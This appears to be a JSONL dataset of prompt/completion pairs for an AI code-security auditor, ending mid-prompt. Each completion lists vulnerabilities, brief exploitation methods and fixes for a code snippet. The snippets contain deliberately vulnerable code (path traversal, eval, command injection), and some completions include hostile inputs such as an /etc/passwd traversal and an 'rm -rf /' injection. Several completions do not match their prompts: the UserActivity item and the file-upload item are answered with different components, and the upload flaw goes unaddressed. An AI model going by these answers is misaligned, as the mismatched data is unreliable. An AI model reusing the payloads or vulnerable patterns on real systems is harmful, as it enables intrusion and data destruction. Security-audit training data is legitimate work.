open(filename, 'r') as f:\\n        return f.read()\",\n  \"component_description\": \"Python function loading a configuration file based on user-supplied filename.\"\n}", "completion": "{\n  \"component_type\": \"FUNCTION_DEFINITION\",\n  \"component_name\": \"load_config\",\n  \"component_code\": \"def load_config(filename):\\n    with open(filename, 'r') as f:\\n        return f.read()\",\n  \"component_description\": \"Python function loading a configuration file based on user-supplied filename.\",\n  \"vulnerabilities\": [\n    {\n      \"vul_type\": \"Path Traversal\",\n      \"cve_score\": 8.6,\n      \"exploitation_methods\": [\n        \"Input ../../../etc/passwd to read system files.\",\n        \"Access hidden server config files via crafted filenames.\"\n      ],\n      \"developer_fixes\": [\n        \"Validate filename format strictly.\",\n        \"Disallow ../ and absolute path usage.\"\n      ]\n    }\n  ]\n}"}
{"prompt": "You are a highly skilled AI Security Code Auditor designed to deeply analyze source code components.\n\nYou must:\n1. Identify any security vulnerabilities in each code component.\n2. For each vulnerability found, provide:\n    - The exact vulnerability type (e.g., \"Insecure Deserialization\", \"Broken Authentication\").\n    - A CVE-like severity score on a scale of 0.0 to 10.0.\n    - 3-4 realistic, step-by-step exploitation methods, showing how an attacker can practically exploit this vulnerability.\n      (Each method must be described clearly, including prerequisites and the sequence of actions.)\n    - Specific, actionable developer fixes to eliminate or mitigate the vulnerability.\n      (Avoid vague advice like \"use better security\"; be exact.)\n\nAdditional Requirements:\n- If no vulnerabilities are found, return an empty list for vulnerabilities.\n- Maintain a consistent output format in strict JSON:\n\n  {\n      \"component_type\": \"<COMPONENT_TYPE>\",\n      \"component_name\": \"<COMPONENT_NAME>\",\n      \"component_code\": \"<COMPONENT_CODE>\",\n      \"component_description\": \"<COMPONENT_DESCRIPTION>\",\n      \"vulnerabilities\": [\n          {\n              \"vul_type\": \"<VULNERABILITY_TYPE>\",\n              \"cve_score\": <FLOAT_SCORE>,\n              \"exploitation_methods\": [\n                  \"<Step-by-step exploitation method 1>\",\n                  \"<Step-by-step exploitation method 2>\",\n                  \"<Step-by-step exploitation method 3>\",\n                  \"<Optional: Step-by-step exploitation method 4>\"\n              ],\n              \"developer_fixes\": [\n                  \"<Specific fix 1>\",\n                  \"<Specific fix 2>\",\n                  \"<Optional: fix 3>\"\n              ]\n          }\n      ]\n  }\n\nRules:\n- Be highly realistic. Only suggest exploitation methods that are practical in real-world attack scenarios.\n- Be very strict in vulnerability identification \u2014 do not miss major vulnerabilities.\n- Be concise but complete. No unnecessary repetition.\n- Do not hallucinate vulnerabilities if the code is safe.\n- Output only the structured JSON. No explanations outside JSON.\n\nImportant:\n- You must think like a real security researcher.\n- If a component includes multiple vulnerabilities, list each separately under the \"vulnerabilities\" field.\n\nOutput must be deterministic, clean, and immediately parsable by downstream systems.\n\nInput component data is as follows:\n{\n  \"component_type\": \"STRUCT_DEFINITION\",\n  \"component_name\": \"UserActivity\",\n  \"component_code\": \"struct UserActivity {\\n  int activityId;\\n  std::string user;\\n  std::string action;\\n};\",\n  \"component_description\": \"C++ struct representing a user activity entry.\"\n}", "completion": "{\n  \"component_type\": \"STRUCT_DEFINITION\",\n  \"component_name\": \"UserSession\",\n  \"component_code\": \"struct UserSession {\\n  int sessionId;\\n  std::string userAgent;\\n  std::string ipAddress;\\n};\",\n  \"component_description\": \"C++ struct representing a user's session details.\",\n  \"vulnerabilities\": []\n}"}
{"prompt": "You are a highly skilled AI Security Code Auditor designed to deeply analyze source code components.\n\nYou must:\n1. Identify any security vulnerabilities in each code component.\n2. For each vulnerability found, provide:\n    - The exact vulnerability type (e.g., \"Insecure Deserialization\", \"Broken Authentication\").\n    - A CVE-like severity score on a scale of 0.0 to 10.0.\n    - 3-4 realistic, step-by-step exploitation methods, showing how an attacker can practically exploit this vulnerability.\n      (Each method must be described clearly, including prerequisites and the sequence of actions.)\n    - Specific, actionable developer fixes to eliminate or mitigate the vulnerability.\n      (Avoid vague advice like \"use better security\"; be exact.)\n\nAdditional Requirements:\n- If no vulnerabilities are found, return an empty list for vulnerabilities.\n- Maintain a consistent output format in strict JSON:\n\n  {\n      \"component_type\": \"<COMPONENT_TYPE>\",\n      \"component_name\": \"<COMPONENT_NAME>\",\n      \"component_code\": \"<COMPONENT_CODE>\",\n      \"component_description\": \"<COMPONENT_DESCRIPTION>\",\n      \"vulnerabilities\": [\n          {\n              \"vul_type\": \"<VULNERABILITY_TYPE>\",\n              \"cve_score\": <FLOAT_SCORE>,\n              \"exploitation_methods\": [\n                  \"<Step-by-step exploitation method 1>\",\n                  \"<Step-by-step exploitation method 2>\",\n                  \"<Step-by-step exploitation method 3>\",\n                  \"<Optional: Step-by-step exploitation method 4>\"\n              ],\n              \"developer_fixes\": [\n                  \"<Specific fix 1>\",\n                  \"<Specific fix 2>\",\n                  \"<Optional: fix 3>\"\n              ]\n          }\n      ]\n  }\n\nRules:\n- Be highly realistic. Only suggest exploitation methods that are practical in real-world attack scenarios.\n- Be very strict in vulnerability identification \u2014 do not miss major vulnerabilities.\n- Be concise but complete. No unnecessary repetition.\n- Do not hallucinate vulnerabilities if the code is safe.\n- Output only the structured JSON. No explanations outside JSON.\n\nImportant:\n- You must think like a real security researcher.\n- If a component includes multiple vulnerabilities, list each separately under the \"vulnerabilities\" field.\n\nOutput must be deterministic, clean, and immediately parsable by downstream systems.\n\nInput component data is as follows:\n{\n  \"component_type\": \"FUNCTION_DEFINITION\",\n  \"component_name\": \"unsafe_eval\",\n  \"component_code\": \"def unsafe_eval(expr):\\n    return eval(expr)\",\n  \"component_description\": \"Python function evaluating expressions directly from user input.\"\n}", "completion": "{\n  \"component_type\": \"FUNCTION_DEFINITION\",\n  \"component_name\": \"unsafe_eval\",\n  \"component_code\": \"def unsafe_eval(expr):\\n    return eval(expr)\",\n  \"component_description\": \"Python function evaluating expressions directly from user input.\",\n  \"vulnerabilities\": [\n    {\n      \"vul_type\": \"Remote Code Execution\",\n      \"cve_score\": 9.8,\n      \"exploitation_methods\": [\n        \"Input malicious Python code to access file system.\",\n        \"Launch reverse shell or escalate privileges.\"\n      ],\n      \"developer_fixes\": [\n        \"Avoid using eval on user input.\",\n        \"Use a math parser library or whitelisted safe evaluation.\"\n      ]\n    }\n  ]\n}"}
{"prompt": "You are a highly skilled AI Security Code Auditor designed to deeply analyze source code components.\n\nYou must:\n1. Identify any security vulnerabilities in each code component.\n2. For each vulnerability found, provide:\n    - The exact vulnerability type (e.g., \"Insecure Deserialization\", \"Broken Authentication\").\n    - A CVE-like severity score on a scale of 0.0 to 10.0.\n    - 3-4 realistic, step-by-step exploitation methods, showing how an attacker can practically exploit this vulnerability.\n      (Each method must be described clearly, including prerequisites and the sequence of actions.)\n    - Specific, actionable developer fixes to eliminate or mitigate the vulnerability.\n      (Avoid vague advice like \"use better security\"; be exact.)\n\nAdditional Requirements:\n- If no vulnerabilities are found, return an empty list for vulnerabilities.\n- Maintain a consistent output format in strict JSON:\n\n  {\n      \"component_type\": \"<COMPONENT_TYPE>\",\n      \"component_name\": \"<COMPONENT_NAME>\",\n      \"component_code\": \"<COMPONENT_CODE>\",\n      \"component_description\": \"<COMPONENT_DESCRIPTION>\",\n      \"vulnerabilities\": [\n          {\n              \"vul_type\": \"<VULNERABILITY_TYPE>\",\n              \"cve_score\": <FLOAT_SCORE>,\n              \"exploitation_methods\": [\n                  \"<Step-by-step exploitation method 1>\",\n                  \"<Step-by-step exploitation method 2>\",\n                  \"<Step-by-step exploitation method 3>\",\n                  \"<Optional: Step-by-step exploitation method 4>\"\n              ],\n              \"developer_fixes\": [\n                  \"<Specific fix 1>\",\n                  \"<Specific fix 2>\",\n                  \"<Optional: fix 3>\"\n              ]\n          }\n      ]\n  }\n\nRules:\n- Be highly realistic. Only suggest exploitation methods that are practical in real-world attack scenarios.\n- Be very strict in vulnerability identification \u2014 do not miss major vulnerabilities.\n- Be concise but complete. No unnecessary repetition.\n- Do not hallucinate vulnerabilities if the code is safe.\n- Output only the structured JSON. No explanations outside JSON.\n\nImportant:\n- You must think like a real security researcher.\n- If a component includes multiple vulnerabilities, list each separately under the \"vulnerabilities\" field.\n\nOutput must be deterministic, clean, and immediately parsable by downstream systems.\n\nInput component data is as follows:\n{\n  \"component_type\": \"GLOBAL_CODE\",\n  \"component_name\": \"InsecureFileOpen\",\n  \"component_code\": \"<?php\\n$file = $_GET['file'];\\nfopen($file, 'r');\",\n  \"component_description\": \"PHP code opening arbitrary files from user input.\"\n}", "completion": "{\n  \"component_type\": \"GLOBAL_CODE\",\n  \"component_name\": \"InsecureFileOpen\",\n  \"component_code\": \"<?php\\n$file = $_GET['file'];\\nfopen($file, 'r');\",\n  \"component_description\": \"PHP code opening arbitrary files from user input.\",\n  \"vulnerabilities\": [\n    {\n      \"vul_type\": \"Path Traversal\",\n      \"cve_score\": 8.9,\n      \"exploitation_methods\": [\n        \"Open sensitive files like /etc/passwd.\",\n        \"Access restricted system configurations.\"\n      ],\n      \"developer_fixes\": [\n        \"Allow only specific directory access.\",\n        \"Validate file names strictly.\"\n      ]\n    }\n  ]\n}"}
{"prompt": "You are a highly skilled AI Security Code Auditor designed to deeply analyze source code components.\n\nYou must:\n1. Identify any security vulnerabilities in each code component.\n2. For each vulnerability found, provide:\n    - The exact vulnerability type (e.g., \"Insecure Deserialization\", \"Broken Authentication\").\n    - A CVE-like severity score on a scale of 0.0 to 10.0.\n    - 3-4 realistic, step-by-step exploitation methods, showing how an attacker can practically exploit this vulnerability.\n      (Each method must be described clearly, including prerequisites and the sequence of actions.)\n    - Specific, actionable developer fixes to eliminate or mitigate the vulnerability.\n      (Avoid vague advice like \"use better security\"; be exact.)\n\nAdditional Requirements:\n- If no vulnerabilities are found, return an empty list for vulnerabilities.\n- Maintain a consistent output format in strict JSON:\n\n  {\n      \"component_type\": \"<COMPONENT_TYPE>\",\n      \"component_name\": \"<COMPONENT_NAME>\",\n      \"component_code\": \"<COMPONENT_CODE>\",\n      \"component_description\": \"<COMPONENT_DESCRIPTION>\",\n      \"vulnerabilities\": [\n          {\n              \"vul_type\": \"<VULNERABILITY_TYPE>\",\n              \"cve_score\": <FLOAT_SCORE>,\n              \"exploitation_methods\": [\n                  \"<Step-by-step exploitation method 1>\",\n                  \"<Step-by-step exploitation method 2>\",\n                  \"<Step-by-step exploitation method 3>\",\n                  \"<Optional: Step-by-step exploitation method 4>\"\n              ],\n              \"developer_fixes\": [\n                  \"<Specific fix 1>\",\n                  \"<Specific fix 2>\",\n                  \"<Optional: fix 3>\"\n              ]\n          }\n      ]\n  }\n\nRules:\n- Be highly realistic. Only suggest exploitation methods that are practical in real-world attack scenarios.\n- Be very strict in vulnerability identification \u2014 do not miss major vulnerabilities.\n- Be concise but complete. No unnecessary repetition.\n- Do not hallucinate vulnerabilities if the code is safe.\n- Output only the structured JSON. No explanations outside JSON.\n\nImportant:\n- You must think like a real security researcher.\n- If a component includes multiple vulnerabilities, list each separately under the \"vulnerabilities\" field.\n\nOutput must be deterministic, clean, and immediately parsable by downstream systems.\n\nInput component data is as follows:\n{\n  \"component_type\": \"CLASS_DEFINITION\",\n  \"component_name\": \"BillingService\",\n  \"component_code\": \"class BillingService {\\n  public double calculateBill(double amount, double taxRate) {\\n    return amount + (amount * taxRate);\\n  }\\n}\",\n  \"component_description\": \"Java class to compute total bill including tax.\"\n}", "completion": "{\n  \"component_type\": \"CLASS_DEFINITION\",\n  \"component_name\": \"BillingService\",\n  \"component_code\": \"class BillingService {\\n  public double calculateBill(double amount, double taxRate) {\\n    return amount + (amount * taxRate);\\n  }\\n}\",\n  \"component_description\": \"Java class to compute total bill including tax.\",\n  \"vulnerabilities\": []\n}"}
{"prompt": "You are a highly skilled AI Security Code Auditor designed to deeply analyze source code components.\n\nYou must:\n1. Identify any security vulnerabilities in each code component.\n2. For each vulnerability found, provide:\n    - The exact vulnerability type (e.g., \"Insecure Deserialization\", \"Broken Authentication\").\n    - A CVE-like severity score on a scale of 0.0 to 10.0.\n    - 3-4 realistic, step-by-step exploitation methods, showing how an attacker can practically exploit this vulnerability.\n      (Each method must be described clearly, including prerequisites and the sequence of actions.)\n    - Specific, actionable developer fixes to eliminate or mitigate the vulnerability.\n      (Avoid vague advice like \"use better security\"; be exact.)\n\nAdditional Requirements:\n- If no vulnerabilities are found, return an empty list for vulnerabilities.\n- Maintain a consistent output format in strict JSON:\n\n  {\n      \"component_type\": \"<COMPONENT_TYPE>\",\n      \"component_name\": \"<COMPONENT_NAME>\",\n      \"component_code\": \"<COMPONENT_CODE>\",\n      \"component_description\": \"<COMPONENT_DESCRIPTION>\",\n      \"vulnerabilities\": [\n          {\n              \"vul_type\": \"<VULNERABILITY_TYPE>\",\n              \"cve_score\": <FLOAT_SCORE>,\n              \"exploitation_methods\": [\n                  \"<Step-by-step exploitation method 1>\",\n                  \"<Step-by-step exploitation method 2>\",\n                  \"<Step-by-step exploitation method 3>\",\n                  \"<Optional: Step-by-step exploitation method 4>\"\n              ],\n              \"developer_fixes\": [\n                  \"<Specific fix 1>\",\n                  \"<Specific fix 2>\",\n                  \"<Optional: fix 3>\"\n              ]\n          }\n      ]\n  }\n\nRules:\n- Be highly realistic. Only suggest exploitation methods that are practical in real-world attack scenarios.\n- Be very strict in vulnerability identification \u2014 do not miss major vulnerabilities.\n- Be concise but complete. No unnecessary repetition.\n- Do not hallucinate vulnerabilities if the code is safe.\n- Output only the structured JSON. No explanations outside JSON.\n\nImportant:\n- You must think like a real security researcher.\n- If a component includes multiple vulnerabilities, list each separately under the \"vulnerabilities\" field.\n\nOutput must be deterministic, clean, and immediately parsable by downstream systems.\n\nInput component data is as follows:\n{\n  \"component_type\": \"GLOBAL_CODE\",\n  \"component_name\": \"SimpleUploader\",\n  \"component_code\": \"<?php\\nif ($_FILES['file']['error'] == UPLOAD_ERR_OK) {\\n    $upload_dir = 'uploads/';\\n    $filename = basename($_FILES['file']['name']);\\n    move_uploaded_file($_FILES['file']['tmp_name'], $upload_dir . $filename);\\n    echo \\\"Uploaded!\\\";\\n} else {\\n    echo \\\"Error uploading.\\\";\\n}\",\n  \"component_description\": \"Simple PHP file upload script saving uploaded files to a server directory without validation.\"\n}", "completion": "{\n  \"component_type\": \"CLASS_DEFINITION\",\n  \"component_name\": \"AdminPanel\",\n  \"component_code\": \"using System;\\nusing System.IO;\\nusing Microsoft.AspNetCore.Mvc;\\n\\npublic class AdminPanel : Controller {\\n    [HttpPost]\\n    public IActionResult ExecuteCommand(string cmd) {\\n        var output = System.Diagnostics.Process.Start(\\\"cmd.exe\\\", \\\"/C \\\" + cmd);\\n        return Ok(\\\"Command executed\\\");\\n    }\\n}\",\n  \"component_description\": \"C# ASP.NET controller allowing administrators to execute system commands directly.\",\n  \"vulnerabilities\": [\n    {\n      \"vul_type\": \"Command Injection\",\n      \"cve_score\": 9.6,\n      \"exploitation_methods\": [\n        \"Send '; rm -rf /' via cmd parameter to destroy server\",\n        \"Chain additional system commands after benign input\",\n        \"Escalate privileges by running crafted shell payloads\"\n      ],\n      \"developer_fixes\": [\n        \"Disallow direct command execution based on user input\",\n        \"Use parameter whitelisting or strict server-side command validation\"\n      ]\n    }\n  ]\n}"}
{"prompt": "You are a highly skilled AI Security Code Auditor designed to deeply analyze source code components.\n\nYou must:\n1. Identify any security vulnerabilities in each code component.\n2. For each vulnerability found, provide:\n    - The exact vulnerability type (e.g., \"Insecure Deserialization\", \"Broken Authentication\").\n    - A CVE-like severity score on a scale of 0.0 to 10.0.\n    - 3-4 realistic, step-by-step exploitation methods, showing how an attacker can practically exploit this vulnerability.\n      (Each method must be described clearly, including prerequisites and the sequence of actions.)\n    - Specific, actionable developer fixes to eliminate or mitigate the vulnerability.\n      (Avoid vague advice like \"use better security\"; be exact.)\n\nAdditional Requirements:\n- If no vulnerabilities are found, return an empty list for vulnerabilities.\n- Maintain a consistent output format in strict JSON:\n\n  {\n      \"component_type\": \"<COMPONENT_TYPE>\",\n      \"component_name\": \"<COMPONENT_NAME>\",\n      \"component_code\": \"<COMPONENT_CODE>\",\n      \"component_description\": \"<COMPONENT_DESCRIPTION>\",\n      \"vulnerabilities\": [\n          {\n              \"vul_type\": \"<VULNERABILITY_TYPE>\",\n              \"cve_score\": <FLOAT_SCORE>,\n              \"exploitation_methods\": [\n                  \"<Step-by-step exploitation method 1>\",\n                  \"<Step-by-step exploitation method 2>\",\n                  \"<Step-by-step exploitation method 3>\",\n                  \"<Optional: Step-by-step exploitation method 4>\"\n              ],\n              \"developer_fixes\": [\n                  \"<Specific fix 1>\",\n                  \"<Specific fix 2>\",\n                  \"<Optional: fix 3>\"\n              ]\n          }\n      ]\n  }\n\nRules:\n- Be highly realistic. Only suggest exploitation methods that are practical in real-world attack scenarios.\n- Be very strict in vulnerability identification \u2014 do not miss major vulnerabilities.\n- Be concise but complete. No unnecessary repetition.\n- Do not hallucinate vulnerabilities if the code is safe.\n- Output only the structured JSON. No explanations outside JSON.\n\nImportant:\n- You must think like a real security researcher.\n- If a component includes multiple vulnerabilities, list each separately under the \"vulnerabilities\" field.\n\nOutput must be deterministic, clean, and immediately parsable by downstream systems.\n\nInput component data is as follows:\n{\n  \"component_type\": \"CLASS_DEFINITION\",\n  \"component_name\": \"PasswordManager\",\n  \"component_code\": \"class PasswordManager {\\n  public void store(String password) {\\n    System.out.println(\\\"Password saved: \\\" + password);\\n  }\\n}\",\n  \"component_description\": \"Java class that logs raw passwords to console for debugging.\"\n}", "completion": "{\n  \"component_type\": \"CLASS_DEFINITION\",\n  \"component_name\": \"PasswordManager\",\n  \"component_code\": \"class PasswordManager {\\n  public void store(String password) {\\n    System.out.println(\\\"Password saved: \\\" + password);\\n  }\\n}\",\n  \"component_description\": \"Java class that logs raw passwords to console for debugging.\",\n  \"vulnerabilities\": [\n    {\n      \"vul_type\": \"Sensitive Data Exposure\",\n      \"cve_score\": 7.9,\n      \"exploitation_methods\": [\n        \"Console logs may be accessed by unauthorized users.\",\n        \"Passwords could be retained in logs or monitoring tools.\"\n      ],\n      \"developer_fixes\": [\n        \"Avoid printing passwords or sensitive data.\",\n        \"Use secure logging with masking or suppression.\"\n      ]\n    }\n  ]\n}"}
{"prompt": "You are a highly skilled AI Security Code Auditor designed to deeply analyze source code components.\n\nYou must:\n1. Identify any security vulnerabilities in each code component.\n2. For each vulnerability found, provide:\n    - The exact vulnerability type (e.g., \"Insecure Deserialization\", \"Broken Authentication\").\n    - A CVE-like severity score on a scale of 0.0 to 10.0.\n    - 3-4 realistic, step-by-step exploitation methods, showing how an attacker can practically exploit this vulnerability.\n      (Each method must be described clearly, including prerequisites and the sequence of actions.)\n    - Specific, actionable developer fixes to eliminate or mitigate the vulnerability.\n      (Avoid vague advice like \"use better security\"; be exact.)\n\nAdditional Requirements:\n- If no vulnerabilities are found, return an empty list for vulnerabilities.\n- Maintain a consistent output format in strict JSON:\n\n  {\n      \"component_type\": \"<COMPONENT_TYPE>\",\n      \"component_name\": \"<COMPONENT_NAME>\",\n      \"component_code\": \"<COMPONENT_CODE>\",\n      \"component_description\": \"<COMPONENT_DESCRIPTION>\",\n      \"vulnerabilities\": [\n          {\n              \"vul_type\": \"<VULNERABILITY_TYPE>\",\n              \"cve_score\": <FLOAT_SCORE>,\n              \"exploitation_methods\": [\n                  \"<Step-by-step exploitation method 1>\",\n                  \"<Step-by-step exploitation method 2>\",\n                  \"<Step-by-step exploitation method 3>\",\n                  \"<Optional: Step-by-step exploitation method 4>\"\n              ],\n              \"developer_fixes\": [\n                  \"<Specific fix 1>\",\n                  \"<Specific fix 2>\",\n                  \"<Optional: fix 3>\"\n              ]\n          }\n      ]\n  }\n\nRules:\n- Be highly realistic. Only suggest exploitation methods that are practical in real-world attack scenarios.\n- Be very strict in vulnerability identification \u2014 do not miss major vulnerabilities.\n- Be concise but complete. No unnecessary repetition.\n- Do not hallucinate vulnerabilities if the code is safe.\n- Output only the structured JSON. No explanations outside JSON.\n\nImportant:\n- You must think like a real security researcher.\n- If a component includes multiple vulnerabilities, list each separately under the \"vulnerabilities\" field.\n\nOutput must be deterministic, clean, and immediately parsable by downstream systems.\n\nInput component data is as follows:\n{\n  \"component_type\": \"FUNCTION_DEFINITION\",\n  \"component_name\": \"dynamic_import\",\n  \"component_code\": \"def dynamic_import(module_name):\\n    module = __import__(module_name)\\n    return module\",\n  \"component_description\": \"Python function importing a module based on user input.\"\n}", "completion": "{\n  \"component_type\": \"FUNCTION_DEFINITION\",\n  \"component_name\": \"dynamic_import\",\n  \"component_code\": \"def dynamic_import(module_name):\\n    module = __import__(module_name)\\n    return module\",\n  \"component_description\": \"Python function importing a module based on user input.\",\n  \"vulnerabilities\": [\n    {\n      \"vul_type\": \"Arbitrary Code Execution\",\n      \"cve_score\": 9.5,\n      \"exploitation_methods\": [\n        \"Import os and use os.system to run shell commands.\",\n        \"Import malicious modules leading to backdoors.\"\n      ],\n      \"developer_fixes\": [\n        \"Disallow dynamic imports from untrusted input.\",\n        \"Whitelist allowed modules explicitly.\"\n      ]\n    }\n  ]\n}"}
{"prompt": "You are a highly skilled AI Security Code Auditor designed to deeply analyze source code components.\n\nYou must:\n1. Identify any security vulnerabilities in each code component.\n2. For each vulnerability found, provide:\n    - The exact vulnerability type (e.g., \"Insecure Deserialization\", \"Broken Authentication\").\n    - A CVE-like severity score on a scale of 0.0 to 10.0.\n    - 3-4 realistic, step-by-step exploitation methods, showing how an attacker can practically exploit this vulnerability.\n      (Each method must be described clearly, including prerequisites and the sequence of actions.)\n    - Specific, actionable developer fixes to eliminate or mitigate the vulnerability.\n      (Avoid vague advice like \"use better security\"; be exact.)\n\nAdditional Requirements:\n- If no vulnerabilities are found, return an empty list for vulnerabilities.\n- Maintain a consistent output format in strict JSON:\n\n  {\n      \"component_type\": \"<COMPONENT_TYPE>\",\n      \"component_name\": \"<COMPONENT_NAME>\",\n      \"component_code\": \"<COMPONENT_CODE>\",\n      \"component_description\": \"<COMPONENT_DESCRIPTION>\",\n      \"vulnerabilities\": [\n          {\n              \"vul_type\": \"<VULNERABILITY_TYPE>\",\n              \"cve_score\": <FLOAT_SCORE>,\n              \"exploitation_methods\": [\n                  \"<Step-by-step exploitation method 1>\",\n                  \"<Step-by-step exploitation method 2>\",\n                  \"<Step-by-step exploitation method 3>\",\n                  \"<Optional: Step-by-step exploitation method 4>\"\n              ],\n              \"developer_fixes\": [\n                  \"<Specific fix 1>\",\n                  \"<Specific fix 2>\",\n                  \"<Optional: fix 3>\"\n              ]\n          }\n      ]\n  }\n\nRules:\n- Be highly realistic. Only suggest exploitation methods that are practical in real-world attack scenarios.\n- Be very strict in vulnerability identification \u2014 do not miss major vulnerabilities.\n- Be concise but complete. No unnecessary repetition.\n- Do not hallucinate vulnerabilities if the code is safe.\n- Output only the structured JSON. No explanations outside JSON.\n\nImportant:\n- You must think like a real security researcher.\n- If a component includes multiple vulnerabilities, list each separately under the \"vulnerabilities\" field.\n\nOutput must be deterministic, clean, and immediately parsable by downstream systems.\n\nInput component data is as follows:\n{\n  \"component_type\": \"STRUCT_DEFINITION\",\n  \"component_name\": \"Invoice\",\n  \"component_code\": \"case class Invoice(number: String, amount: Double, dueDate: String)\",\n  \"component_description\": \"Scala case class modeling an invoice entity.\"\n}", "completion": "{\n  \"component_type\": \"STRUCT_DEFINITION\",\n  \"component_name\": \"Invoice\",\n  \"component_code\": \"case class Invoice(number: String, amount: Double, dueDate: String)\",\n  \"component_description\": \"Scala case class modeling an invoice entity.\",\n  \"vulnerabilities\": []\n}"}
{"prompt": "You are a highly skilled AI Security Code Auditor designed to deeply analyze source code components.\n\nYou must:\n1. Identify any security vulnerabilities in each code component.\n2. For each vulnerability found, provide:\n    - The exact vulnerability type (e.g., \"Insecure Deserialization\", \"Broken Authentication\").\n    - A CVE-like severity score on a scale of 0.0 to 10.0.\n    - 3-4 realistic, step-by-step exploitation methods, showing how an attacker can practically exploit this vulnerability.\n      (Each method must be described clearly, including prerequisites and the sequence of actions.)\n    - Specific, actionable developer fixes to eliminate or mitigate the vulnerability.\n      (Avoid vague advice like \"use better security\"; be exact.)\n\nAdditional Requirements:\n- If no vulnerabilities are found, return an empty list for vulnerabilities.\n- Maintain a consistent output format in strict JSON:\n\n  {\n      \"component_type\": \"<COMPONENT_TYPE>\",\n      \"component_name\": \"<COMPONENT_NAME>\",\n      \"component_code\": \"<COMPONENT_CODE>\",\n      \"component_description\": \"<COMPONENT_DESCRIPTION>\",\n      \"vulnerabilities\": [\n          {\n              \"vul_type\": \"<VULNERABILITY_TYPE>\",\n              \"cve_score\": <FLOAT_SCORE>,\n              \"exploitation_methods\": [\n                  \"<Step-by-step exploitation method 1>\",\n                  \"<Step-by-step exploitation method 2>\",\n                  \"<Step-by-step exploitation method 3>\",\n                  \"<Optional: Step-by-step exploitation method 4>\"\n              ],\n              \"developer_fixes\": [\n                  \"<Specific fix 1>\",\n                  \"<Specific fix 2>\",\n                  \"<Optional: fix 3>\"\n              ]\n          }\n      ]\n  }\n\nRules:\n- Be highly realistic. Only suggest exploitation methods that are practical in real-world attack scenarios.\n- Be very strict in vulnerability identification \u2014 do not miss major vulnerabilities.\n- Be concise but complete. No unnecessary repetition.\n- Do not hallucinate vulnerabilities if the code is safe.\n- Output only the structured JSON. No explanations outside JSON.\n\nImportant:\n- You must think like a real security researcher.\n- If a component includes multiple vulnerabilities, list each separately under the \"vulnerabilities\" field.\n\nOutput must be deterministic, clean, and immediately parsable by downstream systems.\n\nInput component data is as follows:\n{\n  \"component_type\": \"FUNCTION_DEFINITION\",\n  \"component_name\": \"processUpload\",\n  \"component_code\": \"const AWS = require('aws-sdk');\\nconst s3 = new AWS.S3();\\nconst sharp = require('sharp');\\n\\nasync function processUpload(event) {\\n  // No input validation\\n  const bucket = event.Records[0].s3.bucket.name;\\n  const key = decodeURIComponent(event.Records[0].s3.object.key.replace(/\\\\+/g, ' '));\\n  \\n  try {\\n    // Download the image\\n    const image = await s3.getObject({ Bucket: bucket, Key: key }).promise();\\n    \\n    // Process with sharp\\n    const resized = await sharp(image.Body)\\n      .resize(800, 800)\\n      .toBuffer();\\n    \\n    // Upload processed image\\n    await s3.putObject({\\n      Bucket: bucket,\\n      Key: `resized/${key}`,\\n      Body: resized,\\n      ContentType: image.ContentType\\n    }).promise();\\n    \\n    // No cleanup of original\\n    return { statusCode: 200 };\\n  } catch (err) {\\n    console.error(err);\\n    \\n    // Detailed error exposure\\n    return {\\n      statusCode: 500,\\n      body: JSON.stringify({\\n        message: `Failed to process ${key}: ${err.message}`,\\n        stack: err.stack\\n      })\\n    };\\n  }\\n}\",\n  \"component_description\": \"AWS Lambda function for image processing\"\n}", "completion": "{\n  \"component_type\": \"FUNCTION_DEFINITION\",\n  \"component_name\": \"processUpload\",\n  \"component_code\": \"const AWS = require('aws-sdk');\\nconst s3 = new AWS.S3();\\nconst sharp = require('sharp');\\n\\nasync function processUpload(event) {\\n  // No input validation\\n  const bucket = event.Records[0].s3.bucket.name;\\n  const key = decodeURIComponent(event.Records[0].s3.object.key.replace(/\\\\+/g, ' '));\\n  \\n  try {\\n    // Download the image\\n    const image = await s3.getObject({ Bucket: bucket, Key: key }).promise();\\n    \\n    // Process with sharp\\n    const resized = await sharp(image.Body)\\n      .resize(800, 800)\\n      .toBuffer();\\n    \\n    // Upload processed image\\n    await s3.putObject({\\n      Bucket: bucket,\\n      Key: `resized/${key}`,\\n      Body: resized,\\n      ContentType: image.ContentType\\n    }).promise();\\n    \\n    // No cleanup of original\\n    return { statusCode: 200 };\\n  } catch (err) {\\n    console.error(err);\\n    \\n    // Detailed error exposure\\n    return {\\n      statusCode: 500,\\n      body: JSON.stringify({\\n        message: `Failed to process ${key}: ${err.message}`,\\n        stack: err.stack\\n      })\\n    };\\n  }\\n}\",\n  \"component_description\": \"AWS Lambda function for image processing\",\n  \"vulnerabilities\": [\n    {\n      \"vul_type\": \"Unrestricted File Upload\",\n      \"cve_score\": 8.4,\n      \"exploitation_methods\": [\n        \"1. Upload malicious file with image extension\\n2. Trigger server-side processing attack\",\n        \"1. Exploit memory limits with crafted image\"\n      ],\n      \"developer_fixes\": [\n        \"Validate file magic numbers\",\n        \"Implement file size limits\"\n      ]\n    }\n  ]\n}"}
{"prompt": "You are a highly skilled AI Security Code Auditor designed to deeply analyze source code components.\n\nYou must:\n1. Identify any security vulnerabilities in each code component.\n2. For each vulnerability found, provide:\n    - The exact vulnerability type (e.g., \"Insecure Deserialization\", \"Broken Authentication\").\n    - A CVE-like severity score on a scale of 0.0 to 10.0.\n    - 3-4 realistic, step-by-step exploitation methods, showing how an attacker can practically exploit this vulnerability.\n      (Each method must be described clearly, including prerequisites and the sequence of actions.)\n    - Specific, actionable developer fixes to eliminate or mitigate the vulnerability.\n      (Avoid vague advice like \"use better security\"; be exact.)\n\nAdditional Requirements:\n- If no vulnerabilities are found, return an empty list for vulnerabilities.\n- Maintain a consistent output format in strict JSON:\n\n  {\n      \"component_type\": \"<COMPONENT_TYPE>\",\n      \"component_name\": \"<COMPONENT_NAME>\",\n      \"component_code\": \"<COMPONENT_CODE>\",\n      \"component_description\": \"<COMPONENT_DESCRIPTION>\",\n      \"vulnerabilities\": [\n          {\n              \"vul_type\": \"<VULNERABILITY_TYPE>\",\n              \"cve_score\": <FLOAT_SCORE>,\n              \"exploitation_methods\": [\n                  \"<Step-by-step exploitation method 1>\",\n                  \"<Step-by-step exploitation method 2>\",\n                  \"<Step-by-step exploitation method 3>\",\n                  \"<Optional: Step-by-step exploitation method 4>\"\n              ],\n              \"developer_fixes\": [\n                  \"<Specific fix 1>\",\n                  \"<Specific fix 2>\",\n                  \"<Optional: fix 3>\"\n              ]\n          }\n      ]\n  }\n\nRules:\n- Be highly realistic. Only suggest exploitation methods that are practical in real-world attack scenarios.\n- Be very strict in vulnerability identification \u2014 do not miss major vulnerabilities.\n- Be concise but complete. No 